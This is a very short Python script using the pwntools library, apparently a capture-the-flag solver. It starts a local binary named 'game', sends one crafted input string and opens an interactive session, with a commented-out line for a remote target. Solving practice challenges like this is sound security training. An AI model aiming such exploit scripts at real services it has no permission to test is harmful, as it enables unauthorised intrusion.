from pwn import *

io = process('./game')
#io = remote()
io.sendline(b'aaaaaaaawwwwp')
io.interactive()